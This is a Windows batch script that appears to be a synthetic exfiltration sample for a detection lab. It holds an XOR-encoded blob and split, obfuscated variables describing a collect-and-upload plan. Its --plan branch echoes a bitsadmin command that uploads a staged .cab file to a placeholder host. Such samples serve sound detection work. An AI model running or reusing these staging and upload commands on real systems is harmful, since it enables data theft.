@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:decimal_bytes|xor_5a
rem HUNTRESS-MATERIAL:44.103.107.38.41.46.63.42.41.103.54.53.57.59.46.63.5.54.53.57.59.54.118.42.40.63.42.59.40.63.5.46.40.59.52.41.60.63.40.118.47.42.54.53.59.62.5.40.63.55.53.46.63.38.59.62.59.42.46.63.40.103.56.51.46.41.59.62.55.51.52.116.63.34.63.38.41.46.59.61.63.5.57.53.47.52.46.103.107.38.61.40.59.42.50.103.62.51.59.55.53.52.62.38.52.63.34.46.5.54.59.52.61.47.59.61.63.103.52.53.52.63.38.57.59.55.42.59.51.61.52.5.51.62.103.57.59.55.42.59.51.61.52.119.63.110.59.57.60.105.62.108.99.62.38.41.53.47.40.57.63.5.42.59.46.50.103.25.96.6.15.41.63.40.41.6.10.47.56.54.51.57.6.18.47.52.46.40.63.41.41.22.59.56.6.57.53.54.54.63.57.46.119.63.110.59.57.60.105.62.108.99.62.116.57.59.56.38.47.42.54.53.59.62.5.47.40.54.103.50.46.46.42.41.96.117.117.63.110.59.57.60.105.62.108.99.62.116.63.34.59.55.42.54.63.116.51.52.44.59.54.51.62.117.47.42.54.53.59.62
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "v_a0=v=1|steps=locate_local,prepare_transfer,upload_remote|adapter=bitsad"& rem HUNTRESS quote compound
set "v_a1=min.exe|stage_count=1|graph=diamond|next_language=none|campaign_id=c"& rem HUNTRESS quote compound
set "v_a2=ampaign-e4acf3d69d|source_path=C:\Users\Public\HuntressLab\collect-e"& rem HUNTRESS quote compound
set "v_a3=4acf3d69d.cab|upload_url=https://e4acf3d69d.example.invalid/upload"& rem HUNTRESS quote compound
goto :HUNTRESS_SEPARATOR_DONE
ver >nul && rem HUNTRESS separator double ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_dead_label=3974e88c"
set "HUNTRESS_READY=1"
if defined HUNTRESS_READY call set "cfg=%%v_a0%%%%v_a1%%%%v_a2%%%%v_a3%%"
echo(!cfg!
exit /b 0
:HUNTRESS_UNUSED
goto :HUNTRESS_PLAN
:HUNTRESS_PLAN
echo bitsadmin.exe upload C:\Users\Public\HuntressLab\collect-e4acf3d69d.cab to https://e4acf3d69d.example.invalid/upload
exit /b 0
